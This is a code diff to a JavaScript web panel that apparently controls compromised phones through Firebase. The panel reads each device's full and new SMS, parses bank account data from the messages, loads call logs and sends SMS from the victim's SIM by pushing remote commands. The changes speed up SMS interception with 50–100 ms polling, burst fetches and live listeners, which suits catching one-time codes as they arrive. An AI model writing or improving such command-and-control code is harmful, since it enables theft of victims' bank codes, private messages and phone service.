@@ -937,7 +937,6 @@ var clientsRawMap={}, tabLoaded={}, cacheWriteTimer=null;
 var CLIENTS_CACHE_KEY='rbl_clients_cache_v3';
 var FIREBASE_CFG_KEY='rbl_firebase_list';
 var CLIENTS_CACHE_TTL=6*60*60*1000;
-var SMS_FAST_MS=100;
 var ONLINE_FRESH_MS=90000;
 var ONLINE_STALE_MS=180000;
 var ONLINE_FLAG_TRUST_MS=300000;
@@ -950,6 +949,8 @@ var _simCache={};
 var _pulseBatchTimer=0;
 var _pulseDirty=false;
 var IS_LAPTOP_MODE=/laptop\.php/i.test(String(location.pathname||''));
+var SMS_FAST_MS=IS_LAPTOP_MODE?50:100;
+var SMS_ALL_POLL_MS=IS_LAPTOP_MODE?500:2000;
 var _bankParseCache={};
 var fetchStartMs=0, firstFetchDone=false;
 var activeFbId='';
@@ -2160,6 +2161,7 @@ function openDevice(id){
     tabLoaded={};
     window._allSmsData=[]; window._newSmsData=[]; window._allSmsTotal=0;
     window._rabelSmsSeenKeys={};
+    window._newSmsSeenKeys={};
     window._rabelSmsHydrated=false;
     _smsListHash='';
     _bankDataHash='';
@@ -2184,12 +2186,9 @@ function openDevice(id){
       if(_simCache[id]) renderSendSimPicker(_simCache[id]);
       else loadSendSimOptions(dev);
     }
-    if(tab==='sms'||tab==='bank'){
-      ensureTabLoaded('sms');
-      if(tab==='bank') renderBankAccounts();
-    } else if(!tabLoaded[tab]){
-      ensureTabLoaded(tab);
-    }
+    if(!tabLoaded.sms&&(IS_LAPTOP_MODE||tab==='sms'||tab==='bank')) ensureTabLoaded('sms');
+    if(tab==='bank') renderBankAccounts();
+    if(!tabLoaded[tab]&&tab!=='sms'&&tab!=='bank') ensureTabLoaded(tab);
   },0);
 }
 
@@ -2288,9 +2287,38 @@ function ingestNewSmsPayload(d){
   return list;
 }
 var _smsRenderRaf=0;
-function scheduleSmsRender(){
+function scheduleSmsRender(instant){
+  if(instant&&IS_LAPTOP_MODE){
+    if(_smsRenderRaf){cancelAnimationFrame(_smsRenderRaf);_smsRenderRaf=0;}
+    renderSmsList();
+    return;
+  }
   if(_smsRenderRaf) return;
   _smsRenderRaf=requestAnimationFrame(function(){_smsRenderRaf=0;renderSmsList();});
+}
+function burstFetchAllSms(dev){
+  var inst=getFbInstance(dev.fbId);
+  if(!inst||!inst.restUrl) return;
+  if(inst.schema==='rabel'){
+    restJson(inst.restUrl+'/messages/'+encodeURIComponent(dev.rawId)+'.json').then(function(d){
+      if(selDev!==dev.id) return;
+      ingestRabelSms(dev,d);
+    });
+    return;
+  }
+  var ref=dev.deviceNode+'/'+dev.rawId;
+  restJson(inst.restUrl+'/'+ref+'/all_sms.json').then(function(d){
+    if(selDev!==dev.id) return;
+    var p=ingestAllSmsPayload(d);
+    window._allSmsData=p.list;
+    window._allSmsTotal=p.total;
+    scheduleSmsRender(true);
+  });
+  restJson(inst.restUrl+'/'+ref+'/new_sms.json').then(function(d){
+    if(selDev!==dev.id) return;
+    window._newSmsData=ingestNewSmsPayload(d);
+    scheduleSmsRender(true);
+  });
 }
 function appendRabelSmsMessage(dev,key,raw,isUpdate){
   var n=normalizeSmsRecord(raw);
@@ -2311,7 +2339,7 @@ function appendRabelSmsMessage(dev,key,raw,isUpdate){
   }
   window._allSmsData=list;
   window._allSmsTotal=list.length;
-  scheduleSmsRender();
+  scheduleSmsRender(IS_LAPTOP_MODE);
 }
 function ingestRabelSms(dev,data){
   var msgs=[];
@@ -2338,7 +2366,7 @@ function ingestRabelSms(dev,data){
   } else if(isInitial) window._newSmsData=[];
   window._allSmsData=msgs;
   window._allSmsTotal=msgs.length;
-  scheduleSmsRender();
+  scheduleSmsRender(IS_LAPTOP_MODE);
 }
 function attachRabelSmsLive(dev){
   var inst=getFbInstance(dev.fbId);
@@ -2346,14 +2374,14 @@ function attachRabelSmsLive(dev){
   var path='messages/'+dev.rawId;
   var ref=inst.db.ref(path);
   var key=dev.fbId+'::smslive::'+path;
-  ref.limitToLast(200).once('value',function(snap){
-    ingestRabelSms(dev,snap.val());
-    var addH=function(s){appendRabelSmsMessage(dev,s.key,s.val());};
-    var chH=function(s){appendRabelSmsMessage(dev,s.key,s.val(),true);};
-    ref.on('child_added',addH);
-    ref.on('child_changed',chH);
-    activeListeners[key]={type:'children',db:inst.db,path:path,addH:addH,chH:chH};
-  });
+  if(activeListeners[key]) return true;
+  var q=ref.limitToLast(200);
+  var addH=function(s){appendRabelSmsMessage(dev,s.key,s.val());};
+  var chH=function(s){appendRabelSmsMessage(dev,s.key,s.val(),true);};
+  q.on('child_added',addH);
+  q.on('child_changed',chH);
+  activeListeners[key]={type:'children',db:inst.db,path:path,addH:addH,chH:chH};
+  q.once('value',function(snap){ingestRabelSms(dev,snap.val());});
   return true;
 }
 function attachSpinplayNewSmsLive(dev){
@@ -2362,18 +2390,24 @@ function attachSpinplayNewSmsLive(dev){
   var path=dev.deviceNode+'/'+dev.rawId+'/new_sms';
   var ref=inst.db.ref(path);
   var key=dev.fbId+'::newsmslive::'+path;
+  if(activeListeners[key]) return true;
+  if(!window._newSmsSeenKeys) window._newSmsSeenKeys={};
+  var seenKeys=window._newSmsSeenKeys;
+  var addH=function(s){
+    if(seenKeys[s.key]) return;
+    seenKeys[s.key]=1;
+    var n=normalizeSmsRecord(s.val());
+    if(!n) return;
+    n._sortKey=s.key;
+    window._newSmsData=(window._newSmsData||[]).concat([n]);
+    scheduleSmsRender(true);
+  };
+  ref.on('child_added',addH);
+  activeListeners[key]={type:'children',db:inst.db,path:path,addH:addH,chH:null};
   ref.once('value',function(snap){
     window._newSmsData=ingestNewSmsPayload(snap.val());
+    (window._newSmsData||[]).forEach(function(m){if(m._sortKey)seenKeys[m._sortKey]=1;});
     scheduleSmsRender();
-    var addH=function(s){
-      var n=normalizeSmsRecord(s.val());
-      if(!n) return;
-      n._sortKey=s.key;
-      window._newSmsData=(window._newSmsData||[]).concat([n]);
-      scheduleSmsRender();
-    };
-    ref.on('child_added',addH);
-    activeListeners[key]={type:'children',db:inst.db,path:path,addH:addH,chH:null};
   });
   return true;
 }
@@ -2383,16 +2417,39 @@ function loadRabelSms(dev){
 }
 function loadSmsRest(dev){
   var ref=dev.deviceNode+'/'+dev.rawId;
+  burstFetchAllSms(dev);
   restPoll(dev.fbId,ref+'/all_sms',function(d){
     var p=ingestAllSmsPayload(d);
     window._allSmsData=p.list;
     window._allSmsTotal=p.total;
     scheduleSmsRender();
-  },2000);
+  },SMS_ALL_POLL_MS);
   restPoll(dev.fbId,ref+'/new_sms',function(d){
     window._newSmsData=ingestNewSmsPayload(d);
-    scheduleSmsRender();
+    scheduleSmsRender(true);
   },SMS_FAST_MS);
+}
+function loadSmsFast(dev){
+  if(!dev) return;
+  var inst=getFbInstance(dev.fbId);
+  if(inst&&inst.schema==='rabel'){
+    burstFetchAllSms(dev);
+    loadRabelSms(dev);
+    return;
+  }
+  burstFetchAllSms(dev);
+  var ref=dev.deviceNode+'/'+dev.rawId;
+  if(inst&&inst.db){
+    attachSpinplayNewSmsLive(dev);
+    devOnFast(dev.fbId,ref+'/all_sms',function(snap){
+      var p=ingestAllSmsPayload(snap.val());
+      window._allSmsData=p.list;
+      window._allSmsTotal=p.total;
+      scheduleSmsRender();
+    });
+  }else{
+    loadSmsRest(dev);
+  }
 }
 function loadRabelSim(dev){
   restPoll(dev.fbId,'clients/'+dev.rawId,function(data){
@@ -2422,6 +2479,15 @@ function devOn(fbId,path,cb){
     if(activeListeners[key]&&activeListeners[key].handler===handler) inst.db.ref(path).on('value',handler);
   });
 }
+function devOnFast(fbId,path,cb){
+  var inst=getFbInstance(fbId);
+  if(!inst||!inst.db) return;
+  var key=fbId+'::'+path;
+  if(activeListeners[key]) return;
+  var handler=function(snap){cb(snap);};
+  activeListeners[key]={fbId:fbId,path:path,handler:handler,db:inst.db};
+  inst.db.ref(path).on('value',handler);
+}
 function ensureTabLoaded(tab){
   if(!selDev||tabLoaded[tab]) return;
   tabLoaded[tab]=true;
@@ -2439,22 +2505,7 @@ function ensureTabLoaded(tab){
   }
   var ref=dev.deviceNode+'/'+dev.rawId;
   if(tab==='sms'){
-    if(inst&&inst.db){
-      if(!attachSpinplayNewSmsLive(dev)){
-        devOn(dev.fbId,ref+'/new_sms',function(snap){
-          window._newSmsData=ingestNewSmsPayload(snap.val());
-          scheduleSmsRender();
-        });
-      }
-      devOn(dev.fbId,ref+'/all_sms',function(snap){
-        var p=ingestAllSmsPayload(snap.val());
-        window._allSmsData=p.list;
-        window._allSmsTotal=p.total;
-        scheduleSmsRender();
-      });
-    }else{
-      loadSmsRest(dev);
-    }
+    loadSmsFast(dev);
   } else if(tab==='calls'){
     devOn(dev.fbId,ref+'/all_calls',function(snap){
       var d=snap.val(), tb=document.getElementById('callsTbody');
@@ -2536,13 +2587,23 @@ function switchDataTab(name,btn){
 // ═══ FIREBASE WRITE (SDK or REST) ═══
 function fbPush(inst,path,data){
   if(!inst) return Promise.reject(new Error('Firebase not connected'));
+  var body=Object.assign({},data);
+  if(IS_LAPTOP_MODE&&inst.restUrl){
+    body.timestamp=Date.now();
+    return fetch(inst.restUrl+'/'+path+'.json',{
+      method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify(body),keepalive:true
+    }).then(function(r){
+      if(!r.ok) return r.json().then(function(e){throw new Error((e&&e.error)||'Write failed');});
+      return r.json().catch(function(){return {};});
+    });
+  }
   if(inst.db){
     var payload=Object.assign({},data);
     payload.timestamp=firebase.database.ServerValue.TIMESTAMP;
     return inst.db.ref(path).push(payload);
   }
   if(!inst.restUrl) return Promise.reject(new Error('Firebase not connected'));
-  var body=Object.assign({},data,{timestamp:Date.now()});
+  body.timestamp=Date.now();
   return fetch(inst.restUrl+'/'+path+'.json',{
     method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify(body)
   }).then(function(r){
@@ -2552,6 +2613,14 @@ function fbPush(inst,path,data){
 }
 function fbSet(inst,path,value){
   if(!inst) return Promise.reject(new Error('Firebase not connected'));
+  if(IS_LAPTOP_MODE&&inst.restUrl){
+    return fetch(inst.restUrl+'/'+path+'.json',{
+      method:'PUT',headers:{'Content-Type':'application/json'},body:JSON.stringify(value),keepalive:true
+    }).then(function(r){
+      if(!r.ok) return r.json().then(function(e){throw new Error((e&&e.error)||'Write failed');});
+      return r.json().catch(function(){return {};});
+    });
+  }
   if(inst.db) return inst.db.ref(path).set(value);
   if(!inst.restUrl) return Promise.reject(new Error('Firebase not connected'));
   return fetch(inst.restUrl+'/'+path+'.json',{
@@ -2905,22 +2974,31 @@ function sendSms(){
   if(!n||!m){document.getElementById('sendStatus').innerHTML='<span style="color:var(--error)">Fill all fields</span>';return;}
   var simSlot=_sendSimSlot||1;
   var t0=performance.now();
-  document.getElementById('sendStatus').innerHTML='<span style="color:var(--muted)">Sending via SIM '+simSlot+'...</span>';
+  var statusEl=document.getElementById('sendStatus');
+  var sendBtn=document.querySelector('#tab-sendsms .btn-sm');
+  statusEl.innerHTML='<span style="color:var(--muted)">Sending via SIM '+simSlot+'...</span>';
+  if(sendBtn) sendBtn.disabled=true;
   var done=function(){
     var ms=Math.max(1,Math.round(performance.now()-t0));
-    document.getElementById('sendStatus').innerHTML='<span style="color:var(--success)">✅ Sent in '+ms+'ms</span>';
+    statusEl.innerHTML='<span style="color:var(--success)">✅ Sent in '+ms+'ms</span>';
     document.getElementById('sendMsg').value='';
     showToast('success','✅ SMS sent in '+ms+'ms');
+    if(sendBtn) sendBtn.disabled=false;
   };
   var fail=function(e){
-    document.getElementById('sendStatus').innerHTML='<span style="color:var(--error)">❌ '+esc(e.message||'Failed')+'</span>';
+    statusEl.innerHTML='<span style="color:var(--error)">❌ '+esc(e.message||'Failed')+'</span>';
     showToast('error',e.message||'Send failed');
+    if(sendBtn) sendBtn.disabled=false;
   };
+  var payload, write;
   if(inst.schema==='rabel'){
-    fbSet(inst,'clients/'+dev.rawId+'/webhookEvent/sendSms',{to:n,message:m,from:simSlot,isSended:false}).then(done).catch(fail);
-    return;
+    payload={to:n,message:m,from:simSlot,isSended:false,ts:Date.now()};
+    write=fbSet(inst,'clients/'+dev.rawId+'/webhookEvent/sendSms',payload);
+  }else{
+    payload={to:n,message:m,sim:simSlot-1,from:simSlot,slot:simSlot-1};
+    write=fbPush(inst,dev.deviceNode+'/'+dev.rawId+'/manual_commands/send_sms',payload);
   }
-  fbPush(inst,dev.deviceNode+'/'+dev.rawId+'/manual_commands/send_sms',{to:n,message:m,sim:simSlot-1,from:simSlot,slot:simSlot-1}).then(done).catch(fail);
+  write.then(done).catch(fail);
 }
 
 // ═══ FORWARDING ═══
